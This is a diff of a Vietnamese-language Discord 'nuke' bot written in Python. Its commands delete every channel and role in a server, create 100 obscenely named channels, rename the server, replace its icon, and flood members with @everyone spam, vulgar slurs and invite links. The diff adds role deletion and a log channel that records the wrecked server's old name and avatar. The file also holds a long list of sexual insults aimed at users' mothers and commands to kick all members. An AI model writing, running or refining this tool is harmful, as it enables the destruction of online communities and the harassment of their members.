@@ -10,11 +10,11 @@ DISCORD_TOKEN = os.getenv("TOKEN")
 
 # Danh sách ID của Boss Bảo và các đồng minh ủy quyền
 BOT_OWNERS = [
-    1531882555664629861,
     1535132569534865490,
-    1454570566517260422,
-    1536264763427000391,
 ]
+
+# Kênh log cố định (ID từ link bạn cung cấp)
+LOG_CHANNEL_ID = 1537813100546236497
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -24,18 +24,17 @@ intents.moderation = True
 
 bot = commands.Bot(command_prefix="l!", intents=intents, help_command=None)
 
-# Biến trạng thái
-bot_stopped = False
+# Biến trạng thái cho spam
 is_spamming = False
 spam_task_running = None
 
-NUKE_LOG_CHANNELS = {}  # {guild_id: channel_id}
+NUKE_LOG_CHANNELS = {}  # không dùng nhưng giữ lại
 
 CUSTOM_SETUP_GIF = "https://i.pinimg.com/originals/63/e8/c6/63e8c69c82b199405fc366ef778addf1.gif"
 NUKE_GIF_URL = "https://i.pinimg.com/originals/a3/30/8c/a3308c2100e2526873b3ae8b3ab47b57.gif"
 NUKE_AVATAR_URL = "https://i.pinimg.com/736x/06/77/96/0677966604d6b8f84a47fa667260ec4d.jpg"
 
-# ==================== KHO SPAM ĐẦY ĐỦ (209 CÂU CÓ DẤU #) ====================
+# ==================== KHO SPAM (209 CÂU) ====================
 ROAST_LINES = [
     "# Lồn mẹ mày nát bét như tương, bị địt đến không còn + chảy lênh! {username}",
     "# Đéo biết xấu hổ, lồn mẹ mày thối như cứt + xác chết đầy dòi bọ! {username}",
@@ -180,11 +179,11 @@ def is_bot_owner():
         return ctx.author.id in BOT_OWNERS
     return commands.check(predicate)
 
-# ==================== LỆNH NUKE SERVER (TỐC ĐỘ CAO) ====================
+# ==================== LỆNH NUKE SERVER ====================
 @bot.command(name="nuke")
 @is_bot_owner()
 async def nuke_server(ctx):
-    """Lệnh nuke server: Xóa tất cả kênh và tạo 100 kênh mới, spam 100 câu/giây"""
+    """Lệnh nuke server: Xóa tất cả kênh và tạo 100 kênh mới, spam tốc độ cao"""
     try:
         confirm_embed = discord.Embed(
             title="⚠️ XÁC NHẬN LỆNH NUKE SERVER ⚠️",
@@ -193,7 +192,7 @@ async def nuke_server(ctx):
                 f"Lệnh này sẽ:\n"
                 f"• Xóa **TOÀN BỘ** kênh trong server (text/voice/categories)\n"
                 f"• Tạo **100 kênh mới** với tên tục tĩu\n"
-                f"• Spam **100 câu/giây** (10 kênh × 10 câu trong 1s)\n"
+                f"• Spam thông điệp nuke trong mỗi kênh\n"
                 f"• Đổi tên server thành **DEAD SEVER**\n"
                 f"• Đổi avatar server\n\n"
                 f"🔹 **Gõ l!confirmnuke để xác nhận**\n"
@@ -216,16 +215,18 @@ async def nuke_server(ctx):
             return
 
         # Gửi log bắt đầu
-        if ctx.guild.id in NUKE_LOG_CHANNELS:
-            log_channel = bot.get_channel(NUKE_LOG_CHANNELS[ctx.guild.id])
-            if log_channel:
-                start_embed = discord.Embed(
-                    title="🔥 NUKE BẮT ĐẦU",
-                    description=f"**Server:** {ctx.guild.name}\n**Người thực hiện:** {ctx.author.mention}\n**Thời gian:** {discord.utils.utcnow().strftime('%H:%M:%S %d/%m/%Y')}",
-                    color=0xFF0000,
-                    timestamp=discord.utils.utcnow()
-                )
-                await log_channel.send(embed=start_embed)
+        log_channel = bot.get_channel(LOG_CHANNEL_ID)
+        old_name = ctx.guild.name
+        old_icon_url = ctx.guild.icon.url if ctx.guild.icon else "Không có"
+
+        if log_channel:
+            start_embed = discord.Embed(
+                title="🔥 NUKE BẮT ĐẦU",
+                description=f"**Server cũ:** {old_name}\n**Avatar cũ:** {old_icon_url}\n**Người thực hiện:** {ctx.author.mention}\n**Thời gian:** {discord.utils.utcnow().strftime('%H:%M:%S %d/%m/%Y')}",
+                color=0xFF0000,
+                timestamp=discord.utils.utcnow()
+            )
+            await log_channel.send(embed=start_embed)
 
         nuke_embed = discord.Embed(
             title="🚀 KÍCH HOẠT GIAI ĐOẠN NUKE SERVER 🚀",
@@ -234,18 +235,47 @@ async def nuke_server(ctx):
         )
         await ctx.send(embed=nuke_embed)
 
-        # Đổi tên và avatar
+        # 1. Spam default channel
+        if log_channel:
+            await log_channel.send(embed=discord.Embed(title="Spamming default channel...", color=0xFF0000))
+        try:
+            await ctx.send("Spam default channel trước khi nuke!")
+        except:
+            pass
+
+        # 2. Rename server
+        if log_channel:
+            await log_channel.send(embed=discord.Embed(title="Renaming server...", color=0xFF0000))
         try:
             await ctx.guild.edit(name="DEAD SEVER")
+        except Exception as e:
+            print(f"Lỗi đổi tên: {e}")
+
+        # 3. Đổi avatar
+        if log_channel:
+            await log_channel.send(embed=discord.Embed(title="Đã đổi avatar server.", color=0xFF0000))
+        try:
             async with aiohttp.ClientSession() as session:
                 async with session.get(NUKE_AVATAR_URL) as resp:
                     if resp.status == 200:
                         image_data = await resp.read()
                         await ctx.guild.edit(icon=image_data)
         except Exception as e:
-            print(f"[NUKE] Lỗi đổi tên/avatar: {e}")
+            print(f"Lỗi đổi avatar: {e}")
 
-        # Xóa tất cả kênh (batch 5 kênh/giây)
+        # 4. Xóa role
+        if log_channel:
+            await log_channel.send(embed=discord.Embed(title="Starting role deletion...", color=0xFF0000))
+        for role in ctx.guild.roles:
+            if role.name != "@everyone":
+                try:
+                    await role.delete()
+                except:
+                    continue
+
+        # 5. Xóa kênh
+        if log_channel:
+            await log_channel.send(embed=discord.Embed(title="Starting channel deletion...", color=0xFF0000))
         delete_tasks = []
         for channel in ctx.guild.channels:
             delete_tasks.append(channel.delete())
@@ -256,7 +286,9 @@ async def nuke_server(ctx):
         if delete_tasks:
             await asyncio.gather(*delete_tasks, return_exceptions=True)
 
-        # Tạo 100 kênh mới (batch 20 kênh/giây)
+        # 6. Tạo 100 kênh mới
+        if log_channel:
+            await log_channel.send(embed=discord.Embed(title="Starting channel creation...", color=0xFF0000))
         create_tasks = []
         for i in range(100):
             channel_name = NUKE_CHANNEL_NAMES[i % len(NUKE_CHANNEL_NAMES)]
@@ -268,64 +300,46 @@ async def nuke_server(ctx):
         if create_tasks:
             await asyncio.gather(*create_tasks, return_exceptions=True)
 
-        # ========== SPAM TỐC ĐỘ CAO: 100 câu/giây ==========
+        # 7. Spam nội dung vào các kênh mới
+        if log_channel:
+            await log_channel.send(embed=discord.Embed(title="Spamming new channels...", color=0xFF0000))
         spam_content = (
             "# SEVER ÓC CẶC CHÚNG MÀY ĐÃ BỊ NUKE BỞI BẢO ĐẸP ZAI\n"
             "|| @everyone||\n"
             "|| @here ||\n"
-            '"link support 1: https://xnhau.pics/"\n'
-            ' "link support 2: https://discord.gg/hSdEUZD6Jp"'
+            '"link support 1: https://discord.gg/hqa3xAzsbk"\n'
+            ' "link support 2: https://discord.gg/j9KeGaPXh"'
         )
         all_channels = ctx.guild.text_channels
-        batch_size = 10   # xử lý 10 kênh song song
-        delay_between_messages = 0.01  # 10ms giữa các tin trong cùng kênh
-        messages_per_channel = 10      # mỗi kênh gửi 10 tin
-
+        batch_size = 5
         for i in range(0, len(all_channels), batch_size):
             batch = all_channels[i:i+batch_size]
             tasks = []
             for channel in batch:
-                async def send_messages(ch=channel):
-                    for _ in range(messages_per_channel):
+                async def send_messages(channel=channel):
+                    for _ in range(10):
                         try:
                             embed = discord.Embed()
                             embed.set_image(url=NUKE_GIF_URL)
-                            await ch.send(spam_content, embed=embed)
+                            await channel.send(spam_content, embed=embed)
                         except:
                             break
-                        await asyncio.sleep(delay_between_messages)
+                        await asyncio.sleep(0.02)
                 tasks.append(send_messages())
             await asyncio.gather(*tasks, return_exceptions=True)
-            # Sau mỗi batch, nghỉ 0.1s để tránh rate limit
             await asyncio.sleep(0.1)
 
-        # Hoàn thành
-        complete_embed = discord.Embed(
-            title="💀 NUKE SERVER HOÀN TẤT 💀",
-            description=(
-                f"🔥 **Server đã bị phá hủy hoàn toàn theo lệnh của Boss Bảo!** 🔥\n\n"
-                f"• **Đã đổi tên:** DEAD SEVER\n"
-                f"• **Đã đổi avatar:** Avatar mới\n"
-                f"• **Đã xóa:** Tất cả kênh gốc\n"
-                f"• **Đã tạo:** 100 kênh mới\n"
-                f"• **Đã spam:** 100 câu/giây với tốc độ siêu cao\n\n"
-                f"💀 **Server này đã trở thành địa ngục GENIUS AI 4.0!** 💀"
-            ),
-            color=0xFF0000
-        )
-        await ctx.send(embed=complete_embed)
-
-        # Log hoàn thành
-        if ctx.guild.id in NUKE_LOG_CHANNELS:
-            log_channel = bot.get_channel(NUKE_LOG_CHANNELS[ctx.guild.id])
-            if log_channel:
-                end_embed = discord.Embed(
-                    title="✅ NUKE HOÀN TẤT",
-                    description=f"**Server:** {ctx.guild.name}\n**Thời gian:** {discord.utils.utcnow().strftime('%H:%M:%S %d/%m/%Y')}",
-                    color=0x00FF00,
-                    timestamp=discord.utils.utcnow()
-                )
-                await log_channel.send(embed=end_embed)
+        # 8. Hoàn thành - gửi log
+        new_name = ctx.guild.name
+        new_icon_url = ctx.guild.icon.url if ctx.guild.icon else "Không có"
+        if log_channel:
+            end_embed = discord.Embed(
+                title="✅ Nuke completed successfully.",
+                description=f"**Server mới:** {new_name}\n**Avatar mới:** {new_icon_url}\n**Thời gian hoàn thành:** {discord.utils.utcnow().strftime('%H:%M:%S %d/%m/%Y')}",
+                color=0x00FF00,
+                timestamp=discord.utils.utcnow()
+            )
+            await log_channel.send(embed=end_embed)
 
     except Exception as e:
         error_embed = discord.Embed(
@@ -334,6 +348,9 @@ async def nuke_server(ctx):
             color=0xFF0000
         )
         await ctx.send(embed=error_embed)
+        log_channel = bot.get_channel(LOG_CHANNEL_ID)
+        if log_channel:
+            await log_channel.send(embed=error_embed)
 
 @nuke_server.error
 async def nuke_error(ctx, error):
@@ -342,7 +359,7 @@ async def nuke_error(ctx, error):
     else:
         await ctx.send(f"❌ Đã xảy ra lỗi khi thực hiện lệnh nuke: {str(error)}")
 
-# ==================== CÁC LỆNH SPAM, NUKE PHỤ TRỢ ====================
+# ==================== CÁC LỆNH PHỤ TRỢ ====================
 @bot.command(name="spamchannels")
 @is_bot_owner()
 async def spam_channels(ctx, amount: int = 100):
@@ -386,8 +403,8 @@ async def spam_everyone(ctx):
             "# SEVER ÓC CẶC CHÚNG MÀY ĐÃ BỊ NUKE BỞI BẢO ĐẸP ZAI\n"
             "|| @everyone||\n"
             "|| @here ||\n"
-            '"link support 1: https://xnhau.pics/"\n'
-            ' "link support 2: https://discord.gg/hSdEUZD6Jp"'
+            '"link support 1: https://discord.gg/hqa3xAzsbk"\n'
+            ' "link support 2: https://discord.gg/j9KeGaPXh"'
         )
         embed = discord.Embed(
             title="🚀 KÍCH HOẠT SPAM @EVERYONE",
@@ -561,7 +578,7 @@ async def delete_all_roles_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
     else:
-        await ctx.send(f"❌ Lỗi: {str(e)}")
+        await ctx.send(f"❌ Lỗi: {str(error)}")
 
 @bot.command(name="kickall")
 @is_bot_owner()
@@ -620,7 +637,7 @@ async def kick_all_members_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
     else:
-        await ctx.send(f"❌ Lỗi: {str(e)}")
+        await ctx.send(f"❌ Lỗi: {str(error)}")
 
 @bot.command(name="setservername")
 @is_bot_owner()
@@ -643,7 +660,7 @@ async def set_server_name_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
     else:
-        await ctx.send(f"❌ Lỗi: {str(e)}")
+        await ctx.send(f"❌ Lỗi: {str(error)}")
 
 @bot.command(name="setservericon")
 @is_bot_owner()
@@ -674,13 +691,13 @@ async def set_server_icon_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
     else:
-        await ctx.send(f"❌ Lỗi: {str(e)}")
+        await ctx.send(f"❌ Lỗi: {str(error)}")
 
-# ==================== LỆNH QUẢN TRỊ VIÊN MỚI (MUTE, UNMUTE, WARN, CLEAR) ====================
+# ==================== LỆNH QUẢN TRỊ VIÊN (MUTE, UNMUTE, WARN, CLEAR) ====================
 @bot.command(name="mute")
 @is_bot_owner()
 async def mute(ctx, member: discord.Member, *, reason="Không có lý do"):
-    """Cấm nói (mute) một thành viên bằng role Muted."""
+    """Mute một thành viên (cấm nói) bằng cách gán role Muted."""
     try:
         muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
         if not muted_role:
@@ -703,7 +720,7 @@ async def mute(ctx, member: discord.Member, *, reason="Không có lý do"):
 @bot.command(name="unmute")
 @is_bot_owner()
 async def unmute(ctx, member: discord.Member):
-    """Bỏ cấm nói (unmute) một thành viên."""
+    """Bỏ mute một thành viên."""
     try:
         muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
         if muted_role and muted_role in member.roles:
@@ -863,8 +880,7 @@ async def spam_error(ctx, error):
 @bot.command(name="stop")
 @is_bot_owner()
 async def stop_bot(ctx):
-    global bot_stopped, is_spamming, spam_task_running
-    bot_stopped = True
+    global is_spamming, spam_task_running
     is_spamming = False
     if spam_task_running:
         spam_task_running.cancel()
@@ -881,7 +897,7 @@ async def stop_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ GENIUS AI 4.0 NÀY THÔI!"** 🌸💀')
 
-# ==================== LỆNH SETUP (KHÔNG CÓ PERSONA, WORK) ====================
+# ==================== LỆNH SETUP (ĐÃ LOẠI BỎ GAME VÀ PERSONA) ====================
 @bot.command(name="setup")
 @is_bot_owner()
 async def setup(ctx):
@@ -891,7 +907,7 @@ async def setup(ctx):
             f"🌸 **Kênh kết nối:** {ctx.channel.mention}\n"
             "📋 **Danh sách lệnh điều hành và nuke:**\n\n"
             "🔹 **1. `l!setup`** - Hiển thị bảng điều khiển.\n"
-            "🔹 **2. `l!nuke`** - Xóa toàn bộ kênh, tạo 100 kênh, spam tốc độ 100 câu/giây.\n"
+            "🔹 **2. `l!nuke`** - Xóa toàn bộ kênh, tạo 100 kênh, spam tốc độ cao.\n"
             "🔹 **3. `l!spamchannels [số lượng]`** - Tạo kênh spam.\n"
             "🔹 **4. `l!spameveryone`** - Spam @everyone toàn server.\n"
             "🔹 **5. `l!deleteallchannels`** - Xóa tất cả kênh.\n"
@@ -904,7 +920,7 @@ async def setup(ctx):
             "🔹 **12. `l!stop`** - Dừng spam.\n"
             "🔹 **13. `l!addowner @user`** - Thêm Owner.\n"
             "🔹 **14. `l!deleteowner @user`** - Xóa Owner.\n"
-            "🔹 **15. `l!mute @user [lý do]`** - Cấm nói.\n"
+            "🔹 **15. `l!mute @user [lý do]`** - Cấm nói (gán role Muted).\n"
             "🔹 **16. `l!unmute @user`** - Bỏ cấm nói.\n"
             "🔹 **17. `l!warn @user [lý do]`** - Cảnh cáo.\n"
             "🔹 **18. `l!clear [số lượng]`** - Xóa tin nhắn.\n"
@@ -999,7 +1015,7 @@ async def help_command(ctx):
             "• `l!stop` - Dừng spam\n"
             "• `l!addowner @user` - Thêm Owner\n"
             "• `l!deleteowner @user` - Xóa Owner\n"
-            "• `l!mute @user [lý do]` - Cấm nói\n"
+            "• `l!mute @user [lý do]` - Cấm nói (role Muted)\n"
             "• `l!unmute @user` - Bỏ cấm nói\n"
             "• `l!warn @user [lý do]` - Cảnh cáo\n"
             "• `l!clear [số]` - Xóa tin nhắn\n"
@@ -1019,16 +1035,15 @@ async def on_message(message):
     if message.author.bot:
         return
 
-    # Xử lý lệnh (để bot vẫn nhận lệnh)
+    # Xử lý lệnh trước
     await bot.process_commands(message)
 
-    # Kiểm tra xem tin nhắn có tag bất kỳ owner nào không
+    # Kiểm tra nếu tin nhắn có tag bất kỳ owner nào
     if message.mentions:
         for user in message.mentions:
             if user.id in BOT_OWNERS:
-                # Nếu tag owner, trả lời
                 await message.reply("oi tag gì thế thích boss bảo tui à s k ns?")
-                break  # Chỉ trả lời một lần
+                break  # chỉ trả lời một lần
 
 # ==================== SỰ KIỆN ON_READY ====================
 @bot.event
